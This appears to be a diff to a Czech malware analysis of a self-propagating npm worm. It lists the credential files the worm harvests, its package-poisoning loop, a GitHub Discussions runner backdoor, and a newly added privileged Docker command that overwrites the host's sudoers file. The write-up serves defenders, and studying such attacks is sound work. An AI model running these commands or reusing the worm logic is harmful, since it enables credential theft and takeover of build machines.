@@ -76,7 +76,7 @@ Malware aktivně hledá credentials na těchto místech:
 | `~/.gitconfig` | Git credentials |
 | `~/.ssh/*` | SSH keys |
 | `~/.aws/credentials` | AWS credentials |
-| `~/.aws/config` | AWS config |
+| `~/.aws/config` | AWS config (skenuje VŠECHNY regiony) |
 | `~/.azure/` | Azure credentials |
 | `~/.config/gcloud/application_default_credentials.json` | GCP credentials |
 | `~/.docker/config.json` | Docker registry tokens |
@@ -104,6 +104,8 @@ Malware enumeruje všechny repozitáře uživatele a extrahuje:
 - Repository secrets
 - Environment secrets
 - Organization secrets (pokud má přístup)
+
+Malware specificky hledá secrety začínající na `npm_` v metadatech GitHub Actions, aby se mohl šířit dál (Secondary Token Mining).
 
 #### Cloud Metadata Services
 
@@ -153,7 +155,7 @@ Pokud nemá GitHub credentials, použije credentials ukradené od jiné oběti k
 async function propagate(npmToken) {
   const packages = await getUserPackages(npmToken);
   const targetCount = Math.min(packages.length, 100); // Max 100 packages
-  
+
   for (const pkg of packages.slice(0, targetCount)) {
     await injectPayload(pkg);
     await publishMaliciousVersion(pkg, npmToken);
@@ -180,7 +182,18 @@ jobs:
         run: echo ${{ github.event.discussion.body }}
 ```
 
-To registruje infikovaný stroj jako self-hosted runner a umožňuje vzdálené spouštění příkazů přes GitHub Discussions.
+Toto zaregistruje infikovaný stroj jako self-hosted runner a umožní vzdálené spouštění příkazů přes GitHub Discussions.
+
+#### GitHub Actions Privilege Escalation
+
+Na Linux runnerech se malware pokouší získat root přístup pro manipulaci s DNS a firewally:
+
+1.  **Sudo:** Zkouší `sudo -n true`.
+2.  **Docker Escape:** Pokud sudo selže, použije Docker k mountnutí host filesystému a přepsání `/etc/sudoers.d/runner`:
+    ```bash
+    docker run --rm --privileged -v /:/host ubuntu bash -c "cp /host/tmp/runner /host/etc/sudoers.d/runner"
+    ```
+3.  **Network Control:** Jakmile má root, vypne `systemd-resolved`, unese DNS přes `/tmp/resolved.conf` a flushne `iptables` pro obejití firewallů.
 
 ### 8. Destructive Fallback (Dead-man switch)
 
